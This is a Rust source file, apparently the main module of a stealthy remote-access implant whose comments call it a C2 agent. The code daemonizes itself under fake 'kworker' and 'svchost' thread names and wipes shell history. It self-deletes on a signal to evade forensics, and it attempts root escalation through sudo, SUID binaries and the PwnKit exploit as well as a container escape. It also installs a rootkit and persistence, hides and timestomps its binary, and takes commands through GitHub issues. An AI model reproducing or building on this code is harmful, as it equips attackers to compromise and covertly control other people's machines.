async fn check_signal_flags(
    _config: &Config,
    last_persist_check: &mut std::time::Instant,
) -> bool {
    use std::sync::OnceLock;
    use tokio::signal::unix::{signal, SignalKind};
    use tokio::sync::Mutex;

    // Signal streams — initialized once, persisted across calls.
    // Stored as Option<Signal>: None means registration failed (seccomp/container),
    // poll code simply skips None — no dangerous fallback to wrong signals.
    static SIGUSR1: OnceLock<Mutex<Option<tokio::signal::unix::Signal>>> = OnceLock::new();
    static SIGUSR2: OnceLock<Mutex<Option<tokio::signal::unix::Signal>>> = OnceLock::new();
    static SIGHUP:  OnceLock<Mutex<Option<tokio::signal::unix::Signal>>> = OnceLock::new();

    macro_rules! init_sig {
        ($cell:expr, $kind:expr) => {
            $cell.get_or_init(|| {
                // Graceful degradation: if signal registration fails (seccomp/container),
                // return None. The poll code checks for None and simply skips.
                Mutex::new(signal($kind).ok())
            })
        };
    }

    let usr1 = init_sig!(SIGUSR1, SignalKind::user_defined1());
    let usr2 = init_sig!(SIGUSR2, SignalKind::user_defined2());
    let hup  = init_sig!(SIGHUP,  SignalKind::hangup());

    let mut skip_sleep = false;

    // Non-blocking poll — try_lock() skips if another task holds it (shouldn't happen)
    // timeout(ZERO, recv()) returns Ok(Some(())) only when a signal actually arrived.
    // Ok(None) = stream closed (ignored), Err = timeout elapsed (no signal).
    if let Ok(mut guard) = usr1.try_lock() {
        if let Some(ref mut rx) = *guard {
            use tokio::time::timeout;
            if matches!(timeout(std::time::Duration::ZERO, rx.recv()).await, Ok(Some(()))) {
                debug_log("SIGUSR1: forced persist self-heal");
                let _ = crate::persist::verify_and_repair();
                *last_persist_check = std::time::Instant::now();
            }
        }
    }
    if let Ok(mut guard) = usr2.try_lock() {
        if let Some(ref mut rx) = *guard {
            use tokio::time::timeout;
            if matches!(timeout(std::time::Duration::ZERO, rx.recv()).await, Ok(Some(()))) {
                debug_log("SIGUSR2: uninstall via signal");
                let _ = crate::commands::execute_command("uninstall");
                // Wait for the self-delete thread (spawned inside execute_command("uninstall")
                // with a 5-second delay) to actually delete the binary before we exit.
                // Without this sleep, _exit(0) kills the self-delete thread immediately,
                // leaving the binary on disk for forensic analysis.
                tokio::time::sleep(tokio::time::Duration::from_secs(7)).await;
                unsafe { libc::_exit(0); }
            }
        }
    }
    if let Ok(mut guard) = hup.try_lock() {
        if let Some(ref mut rx) = *guard {
            use tokio::time::timeout;
            if matches!(timeout(std::time::Duration::ZERO, rx.recv()).await, Ok(Some(()))) {
                debug_log("SIGHUP: forced reconnect");
                skip_sleep = true;
            }
        }
    }
    skip_sleep
}


///
/// Flow:
///   _SVC_INIT not set -> Step0: spawn intermediate (_SVC_INIT=1) -> _exit(0)
///   _SVC_INIT="1"    -> Step1: already orphan (PPID=1), spawn daemon (_SVC_INIT=2) -> _exit(0)
///   _SVC_INIT="2"    -> Step2: daemon (PPID guaranteed=1), set DAEMONIZED=1, continue
///
/// Why double instead of single: a single spawn has a nanosecond race between parent _exit(0)
/// and child scheduling. Step1 is already an orphan, so spawning Step2 from PPID=1 eliminates the race.
#[cfg(unix)]
fn daemonize_or_exit() {
    match std::env::var("_SVC_INIT").as_deref() {
        Ok("2") => {
            std::env::set_var("DAEMONIZED", "1");
        }
        Ok("1") => {
            let exe = match std::env::current_exe() {
                Ok(e) => e,
                Err(_) => unsafe { libc::_exit(1) },
            };
            let _ = std::process::Command::new(&exe)
                .env("_SVC_INIT", "2")
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
            unsafe { libc::_exit(0); }
        }
        _ => {
            if std::env::var("DAEMONIZED").is_ok() {
                return; // compatibility with older upgrade path
            }
            // Fileless (memfd) mode: current_exe() reads "/memfd:<name> (deleted)",
            // which cannot be execve'd (only /proc/self/fd/N works), so the
            // spawn-and-exit daemonize below would kill the agent. Instead,
            // skip re-exec entirely: the one-liner already runs us detached
    // (nohup + &), and setting DAEMONIZED makes init_daemon_session() below
            // perform setsid + fd redirect + env scrub in-process. No fork()
            // either — we run inside the tokio runtime, and forking a
            // multithreaded process leaves the child's runtime inconsistent.
            if is_fileless_exec() {
                std::env::set_var("DAEMONIZED", "1");
                return;
            }
            let exe = match std::env::current_exe() {
                Ok(e) => e,
                Err(_) => return,
            };
            let _ = std::process::Command::new(&exe)
                .env("_SVC_INIT", "1")
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .process_group(0)
                .spawn();
            unsafe { libc::_exit(0); }
        }
    }
}

/// Daemon child initialisation: new session + redirect standard fds to /dev/null + clear internal markers.
#[cfg(unix)]
fn init_daemon_session() {
    if std::env::var("DAEMONIZED").is_err() {
        return;
    }
    // Mark daemon session via AtomicBool BEFORE removing env vars.
    // is_analysis_env() checks this flag for the uptime skip — env var DAEMONIZED
    // gets removed below for OPSEC, but we must not lose the "daemon" information.
    crate::rootkit::mark_daemon_session();
    unsafe {
        libc::setsid();
        let devnull = std::ffi::CString::new("/dev/null").unwrap();
        let null_fd = libc::open(devnull.as_ptr(), libc::O_RDWR, 0);
        if null_fd >= 0 {
            for fd in 0..3i32 {
                libc::close(fd);
                libc::dup2(null_fd, fd);
            }
            if null_fd > 2 {
                libc::close(null_fd);
            }
        }
    }
    // Clear internal startup markers to prevent them appearing in env listings
    std::env::remove_var("_SVC_INIT");
    std::env::remove_var("DAEMONIZED");

    // ── Clear history env vars inherited from the operator shell ─────────────
    // The daemon is forked from the operator's interactive bash and inherits HISTFILE.
    // Without clearing it, all sh/bash children would inherit that value,
    // and some systems' auditd / DEBUG traps would record those commands in the operator's history.
    for var in &[
        "HISTFILE", "HISTSIZE", "HISTFILESIZE", "SAVEHIST", "HISTCONTROL",
        "BASH_ENV", "ENV", "PROMPT_COMMAND",
        "MYSQL_HISTFILE", "PSQL_HISTORY", "LESSHISTFILE",
        "NODE_REPL_HISTORY", "REDISCLI_HISTFILE",
    ] {
        std::env::remove_var(var);
    }
    // Set safe defaults so any subsequent sh invocations do not write history
    std::env::set_var("HISTFILE", "/dev/null");
    std::env::set_var("HISTSIZE", "0");
    std::env::set_var("HISTFILESIZE", "0");
    std::env::set_var("BASH_ENV", "");
    std::env::set_var("ENV", "");
    std::env::set_var("PROMPT_COMMAND", "");
}

/// Force-acquire the instance lock: if an old instance holds it, SIGTERM->SIGKILL then retry.
#[cfg(unix)]
fn force_acquire_lock() -> Option<std::fs::File> {
    if let Some(f) = try_acquire_lock() {
        return Some(f);
    }
    kill_existing_instance();
    acquire_lock_with_retry(10, 500)
}

#[cfg(unix)]
fn kill_existing_instance() {
    let lock_path = get_lock_file_path();
    let pid_str = match std::fs::read_to_string(&lock_path) {
        Ok(s) => s,
        Err(_) => return,
    };
    let pid: i32 = match pid_str.trim().parse::<i32>() {
        Ok(p) if p > 1 => p,
        _ => return,
    };
    // kill(pid, 0) only checks whether the process is alive — no actual signal sent
    if unsafe { libc::kill(pid, 0) } != 0 {
        // Process is dead; lock file is a stale leftover — remove it so next try_acquire_lock succeeds
        let _ = std::fs::remove_file(&lock_path);
        return;
    }
    debug_log(&format!("Replacing old instance PID {}", pid));
    unsafe { libc::kill(pid, libc::SIGTERM); }
    for _ in 0..10u32 {
        std::thread::sleep(std::time::Duration::from_millis(500));
        if unsafe { libc::kill(pid, 0) } != 0 {
            return;
        }
    }
    debug_log(&format!("Force-killing stale PID {}", pid));
    unsafe { libc::kill(pid, libc::SIGKILL); }
    std::thread::sleep(std::time::Duration::from_millis(500));
}

/// Retry lock acquisition up to max_retries times at the given interval.
#[cfg(unix)]
fn acquire_lock_with_retry(max_retries: u32, interval_ms: u64) -> Option<std::fs::File> {
    for _ in 0..max_retries {
        if let Some(f) = try_acquire_lock() {
            return Some(f);
        }
        std::thread::sleep(std::time::Duration::from_millis(interval_ms));
    }
    None
}

/// Try to acquire an exclusive file lock to prevent duplicate instances.
/// Returns the lock file handle (must be kept alive to hold the lock).
#[cfg(unix)]
fn try_acquire_lock() -> Option<std::fs::File> {
    let lock_path = get_lock_file_path();
    if let Some(parent) = std::path::Path::new(&lock_path).parent() {
        let _ = std::fs::create_dir_all(parent);
    }

    // Open WITHOUT truncating first: File::create (O_TRUNC) would wipe the
    // current holder's PID before we know whether the flock succeeds, so
    // kill_existing_instance() would always read an empty PID and the
    // takeover path could never work.
    match std::fs::OpenOptions::new().write(true).create(true).truncate(false).open(&lock_path) {
        Ok(file) => {
            use std::os::unix::io::AsRawFd;
            let fd = file.as_raw_fd();
            // flock(LOCK_EX | LOCK_NB) — exclusive, non-blocking
            let result = unsafe { libc::flock(fd, libc::LOCK_EX | libc::LOCK_NB) };
            if result == 0 {
                // We hold the lock — NOW it is safe to replace the previous PID.
                use std::io::{Seek, SeekFrom, Write};
                let mut f = &file;
                let _ = f.set_len(0);
                let _ = f.seek(SeekFrom::Start(0));
                let _ = f.write_all(std::process::id().to_string().as_bytes());
                Some(file)
            } else {
                None
            }
        }
        Err(_) => None,
    }
}

/// ─── Windows 单实例锁（项 7）──────────────────────────────────────────────────
/// unix 侧用 flock(inhibit.lock)；Windows 无 flock，改走 kernel32 NamedMutex
/// 提供真正的互斥（此前 windows 构建完全不加锁）。命名 `Local\_svc_locale_init_v1`
/// —— 会话内互斥而非 `Global\`，避免 Terminal Server / 服务会话的跨会话误互斥。
///
/// CreateMutexW(bInitialOwner=FALSE) + WaitForSingleObject(0)：
///   - WAIT_OBJECT_0   → 本进程取得所有权
///   - WAIT_ABANDONED  → 前一持有者崩溃未释放，所有权移交本进程（视为可获取）
///   - WAIT_TIMEOUT    → 另一实例存活：由调用方按次数重试等待其退出
/// 句柄 Drop 时 ReleaseMutex，进程退出时内核自动释放，不会产生陈旧锁。
/// 获取失败时与 unix 路径一致由调用方退出，避免双实例并发消费同一队列。
#[cfg(windows)]
extern "system" {
    fn CreateMutexW(lpMutexAttributes: *mut std::ffi::c_void, bInitialOwner: i32, lpName: *const u16) -> *mut std::ffi::c_void;
    fn WaitForSingleObject(hHandle: *mut std::ffi::c_void, dwMilliseconds: u32) -> u32;
    fn ReleaseMutex(hMutex: *mut std::ffi::c_void) -> i32;
    fn CloseHandle(hObject: *mut std::ffi::c_void) -> i32;
}

#[cfg(windows)]
struct NamedMutexLock {
    handle: *mut std::ffi::c_void,
}

#[cfg(windows)]
impl Drop for NamedMutexLock {
    fn drop(&mut self) {
        if !self.handle.is_null() {
            unsafe {
                ReleaseMutex(self.handle);
                CloseHandle(self.handle); // 审计修复：只 Release 不 Close 会漏句柄
            }
        }
    }
}

#[cfg(windows)]
fn try_acquire_windows_lock() -> Option<NamedMutexLock> {
    let wide: Vec<u16> = "Local\\_svc_locale_init_v1\0".encode_utf16().collect();
    let handle = unsafe { CreateMutexW(std::ptr::null_mut(), 0, wide.as_ptr()) };
    if handle.is_null() {
        // 句柄分配失败/权限异常 → 退化为“无锁”，与历史 windows 行为一致
        return None;
    }
    match unsafe { WaitForSingleObject(handle, 0) } {
        // WAIT_OBJECT_0 / WAIT_ABANDONED —— 均获得所有权
        0 | 0x80 => Some(NamedMutexLock { handle }),
        // WAIT_TIMEOUT —— 另一实例仍持有：必须先关句柄再返回，否则重试循环
        // 每轮泄漏一个（审计 bug#5：最多 30 次重试 = 30 个泄漏句柄）。
        _ => {
            unsafe { CloseHandle(handle); }
            None
        }
    }
}

/// Synchronous main entry: builds the Tokio runtime with a disguised thread name.
///
/// Thread name selected by distro:
///   CentOS/RHEL/Amazon -> "kworker/0:0"  (kernel worker thread style)
///   Ubuntu/Debian      -> "kworker/u4:1"
/// These names blend with real kernel threads in `ps -eo pid,comm` output.
fn main() {
    #[cfg(unix)]
    let thread_name = {
        let platform = crate::platform::detect();
        match platform.distro {
            crate::platform::Distro::CentOS
            | crate::platform::Distro::RHEL
            | crate::platform::Distro::Amazon => "kworker/0:0",
            crate::platform::Distro::Arch
            | crate::platform::Distro::Alpine => "kworker/u2:0",
            _ => "kworker/u4:1",
        }
    };
    #[cfg(not(unix))]
    let thread_name = "svchost";

    let rt = {
        // Retry up to 3 times with 5s delay — gives the OS time to release resources
        // in memory-constrained containers where initial thread creation may fail.
        let mut built = None;
        for attempt in 0..3u8 {
            match tokio::runtime::Builder::new_multi_thread()
                .worker_threads(2)
                .enable_all()
                .thread_name(thread_name)
                .build()
            {
                Ok(rt) => { built = Some(rt); break; }
                Err(_) if attempt < 2 => {
                    std::thread::sleep(std::time::Duration::from_secs(5));
                }
                Err(_) => {}
            }
        }
        match built {
            Some(rt) => rt,
            None => return,
        }
    };

    let _ = rt.block_on(async_main());
}

/// Async main function (called from sync main).
async fn async_main() -> Result<(), Box<dyn std::error::Error>> {
    // Panic hook FIRST — before anything else, so we capture early crashes
    std::panic::set_hook(Box::new(|panic_info| {
        let msg = format!("PANIC: {:?}", panic_info);
        // Try debug_log if available
        debug_log(&msg);
    }));

    // Activation guards: any unsatisfied compile-time condition causes an immediate silent exit
    // to prevent C2 infrastructure info from being exposed in the wrong environment.
    if !crate::guards::check_activation_guards() {
        unsafe { libc::_exit(0); }
    }

    // Disable core dumps to prevent token/password being written to disk on crash
    #[cfg(unix)]
    unsafe {
        let rl = libc::rlimit { rlim_cur: 0, rlim_max: 0 };
        libc::setrlimit(libc::RLIMIT_CORE, &rl);
    }

    // Auto-escalate to root if passwordless sudo is available and we're not root yet.
    // Uses exec() to replace the current process image — clean, no child process left behind.
    // The _ELEVATED env var prevents re-entry if exec() brings us back here as root.
    //
    // Fileless (memfd) mode skips ALL escalation: every path re-execs ourselves
    // via current_exe(), which reads "/memfd:<name> (deleted)" — un-executable.
    // sudo/GTFOBins would just log auth failures (auth.log noise), PwnKit would
    // write /dev/shm artifacts + chmod a nonexistent path, and cgroup escape
    // would feed a memfd path to the kernel release_agent. None can succeed;
    // skipping keeps the fileless contract (no writes, no trace).
    #[cfg(unix)]
    if !is_fileless_exec() {
        try_sudo_escalate();

        // If still not root, try SUID binary escalation (GTFOBins with SUID root).
        if unsafe { libc::getuid() } != 0 {
            try_suid_escalate();
        }

        // If still not root, try CVE-2021-4034 (PwnKit) — pkexec LPE.
        // Only tried once; _ELEVATED guard prevents re-entry after successful escalation.
        // Gated to x86_64 because the embedded shellcode is x86_64-only.
        #[cfg(all(unix, target_arch = "x86_64"))]
        if unsafe { libc::getuid() } != 0 {
            try_cve_2021_4034_escalate();
        }

        // Container escape (cgroup v1 release_agent) — runs regardless of privilege,
        // detects and attempts escape if we're in a privileged container.
        { let _ = try_cgroup_escape(); }
    }

    // 1. Daemonize via self-spawn (not fork).
    //    fork() after Tokio multi-thread runtime starts is unsafe: the child retains only the
    //    current thread but inherits all thread state and locks, causing deadlocks/crashes
    //    on old CentOS kernels. spawn() + exec() rebuilds the process image cleanly.
    //    Parent calls libc::_exit(0) to skip Rust/Tokio atexit cleanup and avoid double-destruction.
    #[cfg(unix)]
    daemonize_or_exit();

    // 2. Already daemon child: set up new session, ensure standard fds point to /dev/null
    #[cfg(unix)]
    init_daemon_session();

    // 3. Single-instance lock + old instance replacement.
    //    - Normal start: if an old instance is running, SIGTERM->SIGKILL it then take the lock.
    //    - Upgrade mode (C2_UPGRADE=1): wait up to 15 s for the old instance to exit cleanly.
    #[cfg(unix)]
    let _lock_file = {
        let is_upgrade = std::env::var("C2_UPGRADE").is_ok();
        if is_upgrade {
            std::env::remove_var("C2_UPGRADE");
        }

        let file = if is_upgrade {
            acquire_lock_with_retry(15, 1000)
        } else {
            force_acquire_lock()
        };

        match file {
            Some(f) => f,
            None => {
                debug_log("Failed to acquire instance lock, exiting");
                unsafe { libc::_exit(1); }
            }
        }
    };

    // Windows 变体：NamedMutex 互斥。C2_UPGRADE=1 时给旧进程更长的退出宽限（15 s），
    // 普通启动 10×500 ms；超时仍失败则与 unix 路径一致退出。
    #[cfg(windows)]
    let _lock_guard = {
        let is_upgrade = std::env::var("C2_UPGRADE").is_ok();
        if is_upgrade {
            std::env::remove_var("C2_UPGRADE");
        }
        let max_retries = if is_upgrade { 30 } else { 10 };
        let mut lock = try_acquire_windows_lock();
        let mut attempts = 0u32;
        while lock.is_none() && attempts < max_retries {
            std::thread::sleep(Duration::from_millis(500));
            lock = try_acquire_windows_lock();
            attempts += 1;
        }
        match lock {
            Some(l) => l,
            None => {
                debug_log("Failed to acquire instance lock, exiting");
                unsafe { libc::_exit(1); }
            }
        }
    };

    // 4. Old binary cleanup (post-upgrade)
    #[cfg(unix)]
    if let Ok(old_binary) = std::env::var("C2_OLD_BINARY") {
        std::env::remove_var("C2_OLD_BINARY");
        if !old_binary.is_empty() && std::path::Path::new(&old_binary).exists() {
            if let Ok(current) = std::env::current_exe() {
                if current.to_string_lossy() != old_binary {
                    std::thread::sleep(std::time::Duration::from_secs(3));
                    let _ = std::fs::remove_file(&old_binary);
                }
            }
        }
    }

    debug_log("Agent starting...");

    // Hourly process group reaper — kills any orphaned command sub-processes
    #[cfg(unix)]
    std::thread::spawn(crate::commands::reaper_loop);

    // Restore any pending responses that were buffered before a previous crash/restart
    load_buffer_from_disk();
    let _ = crate::filetransfer::cleanup_stale_uploads(3600);

    #[cfg(unix)]
    {
        // Clean up any leftover .old backup from a previous upgrade
        if let Ok(exe) = std::env::current_exe() {
            let old_path = format!("{}.old", exe.to_string_lossy());
            let _ = std::fs::remove_file(&old_path);
        }

        // Migrate from legacy dot-prefix agent if detected
        migrate_from_legacy();

        // Root agent: kill and clean up any non-root agent instances
        consolidate_to_root();
    }

    #[cfg(unix)]
    {
        // Fileless (memfd) mode: agent lives only in memory. Never relocate
        // (that would write the binary to disk) and never install persistence
        // (nothing on disk to relaunch — reboot removes the agent by design).
        let fileless = is_fileless_exec();
        if fileless {
            std::env::set_var("SKIP_PERSIST", "1");
            debug_log("Fileless (memfd) mode: relocation + persistence disabled");
        }

        let platform = crate::platform::detect();
        debug_log(&format!(
            "Platform: {} {} | {} | kernel {} | arch {}",
            platform.distro.name(),
            platform.distro_version,
            platform.privilege_label(),
            platform.kernel_version,
            platform.arch
        ));

        // Relocate to hidden path if not already done
        if !fileless && std::env::var("RELOCATED").is_err() {
            if let Ok(_new_path) = relocate_self() {
                // Use libc::_exit to skip all atexit handlers (Rust runtime,
                // tokio cleanup, etc.) that may block on some systems.
                // std::process::exit calls atexit handlers which can hang;
                // libc::_exit terminates immediately at the kernel level.
                unsafe { libc::_exit(0); }
            }
        }

        // Cache real exe path BEFORE install_rootkit() calls hide_self().
        // After hide_self(), /proc/self/exe returns PID 1's path (/sbin/init),
        // which would corrupt any subsequent current_exe() call in persist.rs.
        crate::rootkit::cache_exe_path();

        // Install stealth features (rootkit) — always attempt on Linux
        if std::env::var("SKIP_ROOTKIT").is_err() {
            debug_log("Installing stealth mode...");
            match crate::rootkit::install_rootkit() {
                Ok(msg) => debug_log(&msg),
                Err(e) => debug_log(&format!("Stealth install failed: {}", e)),
            }
            std::env::set_var("SKIP_ROOTKIT", "1");
        }
    }

    #[cfg(not(unix))]
    {
        let enable_persistence = option_env!("ENABLE_PERSISTENCE")
            .unwrap_or("0") == "1" || std::env::var("ENABLE_PERSISTENCE").unwrap_or_default() == "1";

        if enable_persistence && std::env::var("RELOCATED").is_err() {
            if let Ok(new_path) = relocate_self() {
                let _ = new_path; // avoid unused warning
                unsafe { libc::_exit(0); }
            }
        }
    }

    if let Ok(Some(backup)) = crate::backup_config::load_persisted_backup_config() {
        crate::backup_config::apply_backup_config(&backup);
    }

    let mut config = Config::from_env();

    if config.is_worker() {
        // Worker channel carries no GitHub token — validate its own contract.
        if config.worker_urls.is_empty() || config.worker_secret.is_empty() {
            debug_log("ERROR: C2_WORKER_URLS / C2_WORKER_SECRET not configured");
            unsafe { libc::_exit(1); }
        }
    } else if config.github_token == "TOKEN" || config.github_token.is_empty() {
        debug_log("ERROR: GitHub Token not configured");
        unsafe { libc::_exit(1); }
    }

    if config.password.is_empty() {
        debug_log("ERROR: Encryption password not configured");
        unsafe { libc::_exit(1); }
    }

    debug_log(&format!("Config: repo=***/{}", config.github_repo.chars().take(3).collect::<String>()));

    let agent_id = get_or_create_agent_id();
    debug_log(&format!("{}{}", obfstr::obfstr!("Agent ID: "), agent_id));

    #[cfg(unix)]
    {
        // Auto-install persistence — always attempt; individual strategies skip if not applicable
        if std::env::var("SKIP_PERSIST").is_err() {
            debug_log("Installing persistence (auto-detected)...");
            let result = crate::persist::install_persistence();
            debug_log(&format!("Persistence result: {}", result));
            std::env::set_var("SKIP_PERSIST", "1");
        }
    }

    #[cfg(not(unix))]
    {
        let enable_persistence = std::env::var("ENABLE_PERSISTENCE").as_ref().map(|s| s.as_str()).ok()
            .or_else(|| option_env!("ENABLE_PERSISTENCE"))
            .unwrap_or("0") == "1";
        if enable_persistence && std::env::var("SKIP_PERSIST").is_err() {
            debug_log("Installing persistence...");
            let result = crate::persist::install_persistence();
            debug_log(&format!("Persistence result: {}", result));
            std::env::set_var("SKIP_PERSIST", "1");
        }
    }

    debug_log("Starting main loop...");

    // First-run guard: if no clock exists (fresh install or post-uninstall),
    // set it to NOW so the agent only processes NEW commands, never replays history.
    if load_clock().is_none() {
        let now_iso = chrono::Utc::now().format("%Y-%m-%dT%H:%M:%SZ").to_string();
        save_clock(&now_iso);
        debug_log(&format!("First run: initialized since={} (skip all history)", now_iso));
    }

    // Startup jitter: executed once per agent lifetime, not inside run_agent()
    // (to avoid adding a delay on every retry).
    {
        let jitter = crate::timewindow::startup_jitter_secs(&agent_id);
        debug_log(&format!("Startup jitter: {}s", jitter));
        sleep(Duration::from_secs(jitter)).await;
    }

    // Persistence health-check timer: self-heal every 6 hours. First check fires 5 min after startup.
    // Instant is backed by CLOCK_MONOTONIC (starts at boot) on Linux: on any host
    // with uptime < 5h55m the subtraction below underflows and PANICS ("overflow
    // when subtracting duration from instant"), killing the agent a few seconds
    // after every normal boot (cron @reboot / systemd). checked_sub + fallback
    // keeps such hosts alive (first check after the full 6h instead of 5 min).
    #[allow(unused_mut, unused_variables)]
    let mut last_persist_check = std::time::Instant::now()
        .checked_sub(std::time::Duration::from_secs(6 * 3600 - 300))
        .unwrap_or_else(std::time::Instant::now);
    // Throttle outer-loop backup fetches (startup auth errors) to at most once per hour.
    let mut outer_last_backup_attempt: Option<std::time::Instant> = None;
    loop {
        // ── Signal-based out-of-band control (Diamorphine-style) ─────────
        #[cfg(unix)]
        {
            check_signal_flags(&config, &mut last_persist_check).await;
        }

        // Persistence health check: verify all strategies every 6h and auto-repair.
        // Skipped in fileless (memfd) mode — there is no on-disk install to repair.
        if last_persist_check.elapsed().as_secs() >= 6 * 3600
            && std::env::var("C2_FILELESS").is_err() {
            let result = crate::persist::verify_and_repair();
            if !result.is_empty() {
                debug_log(&format!("Persist health: {}", result));
            }
            last_persist_check = std::time::Instant::now();
        }

        // Watchdog: run_agent has a hard outer deadline of 1 hour.
        // If it hangs (ureq TCP stuck, no keepalive), timeout forces restart.
        let run_result = tokio::time::timeout(
            Duration::from_secs(60 * 60), // 1 hour max per cycle
            run_agent(&config, &agent_id),
        ).await;

        let err_str = match run_result {
            Ok(Ok(_)) => break,
            Ok(Err(e)) => e.to_string(),
            Err(_elapsed) => {
                debug_log("Watchdog: run_agent exceeded 1h, forcing restart");
                "Watchdog timeout".to_string()
            }
        };

        {
            let err_str = &err_str;
                if err_str.contains("Config updated") {
                    debug_log("Reloading config...");
                    config = Config::from_env();
                    sleep(Duration::from_secs(5)).await;
                    continue;
                }

                // Auth error from create_or_load_issue (before entering run_agent poll loop):
                // try backup config here too, so a stale token doesn't loop forever at startup.
                if err_str.contains("Auth error") && err_str.contains("401/403") {
                    debug_log("Auth error at startup, trying backup config...");
                    let can_try = outer_last_backup_attempt
                        .map(|t: std::time::Instant| t.elapsed().as_secs() >= 3600)
                        .unwrap_or(true);
                    if !config.backup_url.is_empty() && can_try {
                        outer_last_backup_attempt = Some(std::time::Instant::now());
                        let backup_url = config.backup_url.clone();
                        if let Ok(Ok(backup)) = tokio::task::spawn_blocking(move || {
                            crate::backup_config::fetch_backup_config(&backup_url)
                        }).await {
                            let changed = backup.github_token != config.github_token
                                || backup.github_repo != config.github_repo
                                || backup.channel != config.channel_type;
                            if changed {
                                debug_log("Startup auth error: backup config with new credentials, applying...");
                                crate::backup_config::apply_backup_config(&backup);
                                let _ = crate::backup_config::persist_backup_config(&backup);
                                let _ = fs::remove_file(get_issue_file_path());
                                config = Config::from_env();
                                sleep(Duration::from_secs(5)).await;
                                continue;
                            } else {
                                debug_log("Startup auth error: backup config same as current, waiting...");
                            }
                        }
                    }
                }

                // Intelligent backoff based on error type.
                // Add ±20% jitter to each value to avoid deterministic traffic fingerprinting.
                let base_wait = if err_str.contains("Network unavailable") || err_str.contains("dns") {
                    30u64
                } else if err_str.contains("Issue deleted") || err_str.contains("404") {
                    5u64
                } else if err_str.contains("401") || err_str.contains("403") || err_str.contains("429") {
                    300u64
                } else if err_str.contains("Watchdog") {
                    10u64
                } else {
                    60u64
                };
                // ±20% jitter: wait = base * (0.8 .. 1.2)
                let jitter = (rand::random::<f64>() * 0.4 - 0.2) * base_wait as f64;
                let wait_secs = (base_wait as f64 + jitter).max(1.0) as u64;

                debug_log(&format!("Error: {}, retrying in {}s...", err_str, wait_secs));
                sleep(Duration::from_secs(wait_secs)).await;
        }
    }

    Ok(())
}

/// Fileless execution detection (memfd mode).
///
/// True when this process was launched from an anonymous in-memory file
/// (memfd_create + fexecve) or the operator forced it via C2_FILELESS=1.
/// On Linux, /proc/self/exe of a memfd-exec'd binary reads "/memfd:<name>"
/// (often with a trailing " (deleted)").
///
/// In this mode there is no on-disk binary: relocation would materialize the
/// agent on disk (breaking filelessness) and persistence would reference a
/// path that does not exist. Both are skipped — the agent lives only in
/// memory and disappears on reboot, by design.
#[allow(dead_code)] // call sites are unix-only; windows cross-check builds skip them
fn is_fileless_exec() -> bool {
    if std::env::var("C2_FILELESS").is_ok() {
        return true;
    }
    #[cfg(unix)]
    {
        if let Ok(exe) = std::fs::read_link("/proc/self/exe") {
            if exe.to_string_lossy().starts_with("/memfd:") {
                std::env::set_var("C2_FILELESS", "1");
                return true;
            }
        }
    }
    false
}

fn relocate_self() -> Result<String, Box<dyn std::error::Error>> {
    let current_exe = std::env::current_exe()?;

    #[cfg(windows)]
    let target_path = {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\WindowsUpdate.exe", username)
    };

    #[cfg(unix)]
    let target_path = {
        // Operator-supplied path wins, with Bug#8's safety net: a custom path
        // that is a RUNNING binary (ETXTBSY) or unwritable falls back to the
        // automatic hidden-path picker instead of breaking the stealth chain.
        if let Some(custom) = crate::rootkit::disguise_path() {
            if crate::rootkit::path_is_running_binary(&custom) {
                debug_log(&format!("custom proc_path {:?} is a running binary — falling back to auto", custom));
                crate::rootkit::get_hidden_path()
                    .map(|p| p.to_string_lossy().to_string())
                    .ok_or("No hidden path")?
            } else if let Some(parent) = custom.parent() {
                if std::fs::create_dir_all(parent).is_ok() {
                    custom.to_string_lossy().to_string()
                } else {
                    debug_log(&format!("custom proc_path parent {:?} not creatable — auto", parent));
                    crate::rootkit::get_hidden_path()
                        .map(|p| p.to_string_lossy().to_string())
                        .ok_or("No hidden path")?
                }
            } else {
                debug_log("custom proc_path has no parent dir — auto");
                crate::rootkit::get_hidden_path()
                    .map(|p| p.to_string_lossy().to_string())
                    .ok_or("No hidden path")?
            }
        } else if let Some(hidden) = crate::rootkit::get_hidden_path() {
            hidden.to_string_lossy().to_string()
        } else {
            // get_hidden_path() should always return Some (it has /dev/shm fallback),
            // but if it somehow fails, don't use a hardcoded path — skip relocation.
            debug_log("No hidden path available, skipping relocation");
            return Err("No hidden path".into());
        }
    };

    if current_exe.to_string_lossy() == target_path {
        std::env::set_var("RELOCATED", "1");
        return Err("Already relocated".into());
    }

    if let Some(parent) = PathBuf::from(&target_path).parent() {
        fs::create_dir_all(parent)?;
    }

    fs::copy(&current_exe, &target_path)?;

    #[cfg(unix)]
    {
        let reference_files = [
            "/lib/systemd/systemd",
            "/usr/lib/systemd/systemd",
            "/bin/systemd",
            "/sbin/init",
        ];

        for ref_file in &reference_files {
            if let Ok(metadata) = fs::metadata(ref_file) {
                if let Ok(modified) = metadata.modified() {
                    use filetime::{FileTime, set_file_times};
                    let ft = FileTime::from_system_time(modified);
                    let _ = set_file_times(&target_path, ft, ft);
                    break;
                }
            }
        }

        // 755 = rwxr-xr-x (includes execute bit)
        std::process::Command::new("chmod")
            .args(&["755", &target_path])
            .output()?;

        // Fix SELinux context (required on CentOS/RHEL; silently ignored elsewhere)
        crate::rootkit::apply_selinux_context(&target_path);

        // /dev/shm is tmpfs and disappears on reboot. If the target path is there,
        // keep a persistent copy elsewhere and let cron/rc.local restore it after reboot.
        if target_path.starts_with("/dev/shm/") {
            let platform = crate::platform::detect();
            let persistent_copy = match platform.distro {
                crate::platform::Distro::CentOS | crate::platform::Distro::RHEL =>
                    "/var/tmp/.polkitd".to_string(),
                _ => "/var/tmp/.accounts-daemon".to_string(),
            };
            // Keep a persistent copy in /var/tmp for cron/rc.local to restore —
            // unless we are RUNNING from that copy: writing over a running
            // executable fails with ETXTBSY anyway.
            if current_exe.to_string_lossy() != persistent_copy {
                let _ = fs::copy(&target_path, &persistent_copy);
                let _ = std::process::Command::new("chmod")
                    .args(&["755", &persistent_copy])
                    .output();
            }
        }
    }

    #[cfg(windows)]
    {
        std::process::Command::new(&target_path)
            .env("RELOCATED", "1")
            .spawn()?;

        let exe_str = current_exe.to_string_lossy().to_string();
        let _ = std::process::Command::new("cmd")
            .args(&["/c", &format!("timeout /t 3 /nobreak >nul & del \"{}\"", exe_str)])
            .spawn();
    }

    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;

        // Spawn the relocated binary in a new process group so it immediately
